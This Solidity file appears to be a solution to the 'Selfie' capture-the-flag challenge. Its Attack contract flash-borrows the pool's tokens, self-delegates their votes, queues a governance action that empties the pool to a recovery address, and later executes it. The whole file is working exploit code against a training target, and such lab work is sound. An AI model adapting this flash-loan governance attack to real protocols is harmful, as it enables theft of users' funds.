pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./Selfie.t.sol";

contract Attack is IERC3156FlashBorrower {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;
    uint256 actionId;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function callFlashLoan() external {
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), TOKENS_IN_POOL, bytes(""));
    }

    function onFlashLoan(address, address _token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {   
        // 투표권 부여 
        token.delegate(address(this));

        bytes memory actionData = abi.encodeCall(pool.emergencyExit, recovery);
        actionId = governance.queueAction(address(pool), 0, actionData);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function drain() external {
        governance.executeAction(actionId);
    }
}